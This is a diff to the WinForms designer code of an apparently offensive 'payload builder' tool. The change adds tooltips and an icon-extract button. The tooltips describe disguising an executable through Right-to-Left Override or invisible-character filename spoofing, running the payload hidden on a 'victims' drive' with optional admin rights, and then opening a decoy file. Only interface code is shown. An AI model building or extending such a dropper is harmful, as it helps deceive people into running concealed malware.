@@ -28,8 +28,10 @@
         /// </summary>
         private void InitializeComponent()
         {
+            this.components = new System.ComponentModel.Container();
             this.panel1 = new System.Windows.Forms.Panel();
             this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.panel3 = new System.Windows.Forms.Panel();
             this.btnClearImage = new System.Windows.Forms.LinkLabel();
             this.btnBrowseImage = new System.Windows.Forms.LinkLabel();
             this.groupBox6 = new System.Windows.Forms.GroupBox();
@@ -76,7 +78,8 @@
             this.ofdPayload = new System.Windows.Forms.OpenFileDialog();
             this.ofdSpoof = new System.Windows.Forms.OpenFileDialog();
             this.ofdIcon = new System.Windows.Forms.OpenFileDialog();
-            this.panel3 = new System.Windows.Forms.Panel();
+            this.tooltip = new System.Windows.Forms.ToolTip(this.components);
+            this.btnExtract = new System.Windows.Forms.LinkLabel();
             this.panel1.SuspendLayout();
             this.groupBox2.SuspendLayout();
             this.groupBox6.SuspendLayout();
@@ -107,6 +110,7 @@
             // 
             // groupBox2
             // 
+            this.groupBox2.Controls.Add(this.btnExtract);
             this.groupBox2.Controls.Add(this.panel3);
             this.groupBox2.Controls.Add(this.btnClearImage);
             this.groupBox2.Controls.Add(this.btnBrowseImage);
@@ -123,18 +127,27 @@
             this.groupBox2.TabStop = false;
             this.groupBox2.Text = "Options";
             // 
+            // panel3
+            // 
+            this.panel3.BackColor = System.Drawing.Color.White;
+            this.panel3.Location = new System.Drawing.Point(225, 13);
+            this.panel3.Name = "panel3";
+            this.panel3.Size = new System.Drawing.Size(1, 111);
+            this.panel3.TabIndex = 27;
+            // 
             // btnClearImage
             // 
             this.btnClearImage.ActiveLinkColor = System.Drawing.Color.White;
             this.btnClearImage.AutoSize = true;
             this.btnClearImage.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.btnClearImage.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
-            this.btnClearImage.Location = new System.Drawing.Point(239, 95);
+            this.btnClearImage.Location = new System.Drawing.Point(232, 95);
             this.btnClearImage.Name = "btnClearImage";
             this.btnClearImage.Size = new System.Drawing.Size(27, 15);
             this.btnClearImage.TabIndex = 26;
             this.btnClearImage.TabStop = true;
             this.btnClearImage.Text = "[❌]";
+            this.tooltip.SetToolTip(this.btnClearImage, "Use the default icon");
             this.btnClearImage.VisitedLinkColor = System.Drawing.Color.White;
             this.btnClearImage.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.btnClearImage_LinkClicked);
             // 
@@ -144,12 +157,13 @@
             this.btnBrowseImage.AutoSize = true;
             this.btnBrowseImage.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.btnBrowseImage.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
-            this.btnBrowseImage.Location = new System.Drawing.Point(267, 95);
+            this.btnBrowseImage.Location = new System.Drawing.Point(255, 95);
             this.btnBrowseImage.Name = "btnBrowseImage";
             this.btnBrowseImage.Size = new System.Drawing.Size(24, 15);
             this.btnBrowseImage.TabIndex = 25;
             this.btnBrowseImage.TabStop = true;
             this.btnBrowseImage.Text = "[...]";
+            this.tooltip.SetToolTip(this.btnBrowseImage, "Use a custom icon");
             this.btnBrowseImage.VisitedLinkColor = System.Drawing.Color.White;
             this.btnBrowseImage.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.btnBrowseImage_LinkClicked);
             // 
@@ -174,6 +188,8 @@
             this.radRTLO.Size = new System.Drawing.Size(134, 17);
             this.radRTLO.TabIndex = 2;
             this.radRTLO.Text = "Right to left Override";
+            this.tooltip.SetToolTip(this.radRTLO, "Use the Right to left Override character to reverse a fake extension and the\r\nrea" +
+        "l extension.");
             this.radRTLO.UseVisualStyleBackColor = true;
             // 
             // radOverflow
@@ -184,6 +200,8 @@
             this.radOverflow.Size = new System.Drawing.Size(72, 17);
             this.radOverflow.TabIndex = 1;
             this.radOverflow.Text = "Overflow";
+            this.tooltip.SetToolTip(this.radOverflow, "Overflow the file name with invisible characters between the file name\r\nand exten" +
+        "sion");
             this.radOverflow.UseVisualStyleBackColor = true;
             // 
             // radNone
@@ -196,6 +214,7 @@
             this.radNone.TabIndex = 0;
             this.radNone.TabStop = true;
             this.radNone.Text = "None";
+            this.tooltip.SetToolTip(this.radNone, "No file spoofing");
             this.radNone.UseVisualStyleBackColor = true;
             // 
             // label9
@@ -215,6 +234,7 @@
             this.chkAdminFlag.Size = new System.Drawing.Size(84, 17);
             this.chkAdminFlag.TabIndex = 11;
             this.chkAdminFlag.Text = "Admin Flag";
+            this.tooltip.SetToolTip(this.chkAdminFlag, "Flag the executable to require Administrative priviledges");
             this.chkAdminFlag.UseVisualStyleBackColor = true;
             // 
             // pnlFileOptGroup
@@ -243,6 +263,7 @@
             this.btnCommand.Size = new System.Drawing.Size(25, 22);
             this.btnCommand.TabIndex = 15;
             this.btnCommand.Text = "/c";
+            this.tooltip.SetToolTip(this.btnCommand, "Change the command execution switch");
             this.btnCommand.UseVisualStyleBackColor = false;
             this.btnCommand.Click += new System.EventHandler(this.btnCommand_Click);
             // 
@@ -254,6 +275,7 @@
             this.chkArguments.Size = new System.Drawing.Size(85, 17);
             this.chkArguments.TabIndex = 15;
             this.chkArguments.Text = "Arguments:";
+            this.tooltip.SetToolTip(this.chkArguments, "Enable the payload executable to receive arguments pre-execution");
             this.chkArguments.UseVisualStyleBackColor = true;
             this.chkArguments.CheckedChanged += new System.EventHandler(this.chkArguments_CheckedChanged);
             // 
@@ -274,6 +296,7 @@
             this.tbArguments.Name = "tbArguments";
             this.tbArguments.Size = new System.Drawing.Size(119, 22);
             this.tbArguments.TabIndex = 14;
+            this.tooltip.SetToolTip(this.tbArguments, "Arguments that the payload executable will receive pre-execution.");
             // 
             // chkStreamConsole
             // 
@@ -284,6 +307,8 @@
             this.chkStreamConsole.Size = new System.Drawing.Size(198, 17);
             this.chkStreamConsole.TabIndex = 8;
             this.chkStreamConsole.Text = "Stream console output to text file";
+            this.tooltip.SetToolTip(this.chkStreamConsole, "An alternative dumping/logging option;Stream the console\r\noutput (stdout) to a te" +
+        "xt file\r\n\r\nExecutes as: cmd [opt] [payload] > %random%.txt");
             this.chkStreamConsole.UseVisualStyleBackColor = true;
             // 
             // chkWaitPayloadFinish
@@ -294,6 +319,7 @@
             this.chkWaitPayloadFinish.Size = new System.Drawing.Size(158, 17);
             this.chkWaitPayloadFinish.TabIndex = 12;
             this.chkWaitPayloadFinish.Text = "Wait for payload to finish";
+            this.tooltip.SetToolTip(this.chkWaitPayloadFinish, "Wait for the payload to finish before executing the spoofed file");
             this.chkWaitPayloadFinish.UseVisualStyleBackColor = true;
             // 
             // chkConsole
@@ -304,6 +330,8 @@
             this.chkConsole.Size = new System.Drawing.Size(173, 17);
             this.chkConsole.TabIndex = 7;
             this.chkConsole.Text = "Execute in Command Prompt";
+            this.tooltip.SetToolTip(this.chkConsole, "Execute the payload through the command line / prompt\r\n\r\nExecutes as: cmd [opt] [" +
+        "payload]");
             this.chkConsole.UseVisualStyleBackColor = true;
             this.chkConsole.CheckedChanged += new System.EventHandler(this.chkConsole_CheckedChanged);
             // 
@@ -315,6 +343,7 @@
             this.chkVictimExec.Size = new System.Drawing.Size(149, 17);
             this.chkVictimExec.TabIndex = 10;
             this.chkVictimExec.Text = "Execute in Victims\' Drive";
+            this.tooltip.SetToolTip(this.chkVictimExec, "Copies the payload and spoofed file to the victims\' drive\r\nand executes it there");
             this.chkVictimExec.UseVisualStyleBackColor = true;
             // 
             // imgFileIcon
@@ -350,6 +379,7 @@
             this.btnBuild.Size = new System.Drawing.Size(62, 22);
             this.btnBuild.TabIndex = 14;
             this.btnBuild.Text = "Build";
+            this.tooltip.SetToolTip(this.btnBuild, "Build the payload");
             this.btnBuild.UseVisualStyleBackColor = false;
             // 
             // btn_RefreshDrives
@@ -362,6 +392,7 @@
             this.btn_RefreshDrives.Size = new System.Drawing.Size(26, 22);
             this.btn_RefreshDrives.TabIndex = 16;
             this.btn_RefreshDrives.Text = "⟳";
+            this.tooltip.SetToolTip(this.btn_RefreshDrives, "Rescan for drives");
             this.btn_RefreshDrives.UseVisualStyleBackColor = false;
             this.btn_RefreshDrives.Click += new System.EventHandler(this.btnRefreshDrives_Click);
             // 
@@ -411,6 +442,8 @@
             this.btnSwitchMode.Size = new System.Drawing.Size(25, 22);
             this.btnSwitchMode.TabIndex = 14;
             this.btnSwitchMode.Text = "P";
+            this.tooltip.SetToolTip(this.btnSwitchMode, "Change the payload mode.\r\n\r\n[P] - Payload mode -- Use an executable as a payload." +
+        "\r\n[S] - Shell code payload -- Run a shell command as a payload.");
             this.btnSwitchMode.UseVisualStyleBackColor = false;
             this.btnSwitchMode.Click += new System.EventHandler(this.btnSwitchMode_Click);
             // 
@@ -431,6 +464,7 @@
             this.tbPayload.ReadOnly = true;
             this.tbPayload.Size = new System.Drawing.Size(155, 22);
             this.tbPayload.TabIndex = 1;
+            this.tooltip.SetToolTip(this.tbPayload, "Payload input.\r\nNote: Payloads are always executed with a hidden flag");
             // 
             // label3
             // 
@@ -459,6 +493,7 @@
             this.btnBrowsePayload.Size = new System.Drawing.Size(25, 22);
             this.btnBrowsePayload.TabIndex = 4;
             this.btnBrowsePayload.Text = "...";
+            this.tooltip.SetToolTip(this.btnBrowsePayload, "Browse a payload executable to use");
             this.btnBrowsePayload.UseVisualStyleBackColor = false;
             this.btnBrowsePayload.Click += new System.EventHandler(this.btnBrowsePayload_Click);
             // 
@@ -472,6 +507,8 @@
             this.btnBrowseSpoof.Size = new System.Drawing.Size(25, 22);
             this.btnBrowseSpoof.TabIndex = 5;
             this.btnBrowseSpoof.Text = "...";
+            this.tooltip.SetToolTip(this.btnBrowseSpoof, "Browse a file for the payload to spoof as\r\nNote: Spoof file will be executed rega" +
+        "rdless of format");
             this.btnBrowseSpoof.UseVisualStyleBackColor = false;
             this.btnBrowseSpoof.Click += new System.EventHandler(this.btnBrowseSpoof_Click);
             // 
@@ -497,6 +534,7 @@
             this.lblVersion.Size = new System.Drawing.Size(69, 13);
             this.lblVersion.TabIndex = 1;
             this.lblVersion.Text = "versionlabel";
+            this.tooltip.SetToolTip(this.lblVersion, "Version of the software");
             // 
             // btn3rdParty
             // 
@@ -507,6 +545,7 @@
             this.btn3rdParty.Size = new System.Drawing.Size(39, 13);
             this.btn3rdParty.TabIndex = 21;
             this.btn3rdParty.Text = "About";
+            this.tooltip.SetToolTip(this.btn3rdParty, "Open the about form");
             this.btn3rdParty.Click += new System.EventHandler(this.btn3rdParty_Click);
             // 
             // lblDbg
@@ -517,6 +556,7 @@
             this.lblDbg.Size = new System.Drawing.Size(66, 13);
             this.lblDbg.TabIndex = 17;
             this.lblDbg.Text = "debuglabel";
+            this.tooltip.SetToolTip(this.lblDbg, "Debug label");
             // 
             // groupBox5
             // 
@@ -572,6 +612,7 @@
             this.btnClose.Size = new System.Drawing.Size(18, 13);
             this.btnClose.TabIndex = 0;
             this.btnClose.Text = "❌";
+            this.tooltip.SetToolTip(this.btnClose, "Exit mA");
             this.btnClose.Click += new System.EventHandler(this.btnClose_Click);
             // 
             // titlebar
@@ -622,13 +663,26 @@
             this.ofdIcon.Filter = "Icon Files (*.ico)|*.ico";
             this.ofdIcon.FileOk += new System.ComponentModel.CancelEventHandler(this.ofdIcon_FileOk);
             // 
-            // panel3
+            // tooltip
             // 
-            this.panel3.BackColor = System.Drawing.Color.White;
-            this.panel3.Location = new System.Drawing.Point(225, 13);
-            this.panel3.Name = "panel3";
-            this.panel3.Size = new System.Drawing.Size(1, 111);
-            this.panel3.TabIndex = 27;
+            this.tooltip.AutoPopDelay = 5000;
+            this.tooltip.InitialDelay = 150;
+            this.tooltip.ReshowDelay = 100;
+            // 
+            // btnExtract
+            // 
+            this.btnExtract.ActiveLinkColor = System.Drawing.Color.White;
+            this.btnExtract.AutoSize = true;
+            this.btnExtract.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnExtract.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
+            this.btnExtract.Location = new System.Drawing.Point(275, 95);
+            this.btnExtract.Name = "btnExtract";
+            this.btnExtract.Size = new System.Drawing.Size(23, 15);
+            this.btnExtract.TabIndex = 28;
+            this.btnExtract.TabStop = true;
+            this.btnExtract.Text = "[>]";
+            this.tooltip.SetToolTip(this.btnExtract, "Extract the icon of the current spoofed file");
+            this.btnExtract.VisitedLinkColor = System.Drawing.Color.White;
             // 
             // Form1
             // 
@@ -719,6 +773,8 @@
         private System.Windows.Forms.LinkLabel btnClearImage;
         private System.Windows.Forms.LinkLabel btnBrowseImage;
         private System.Windows.Forms.Panel panel3;
+        private System.Windows.Forms.ToolTip tooltip;
+        private System.Windows.Forms.LinkLabel btnExtract;
     }
 }
 
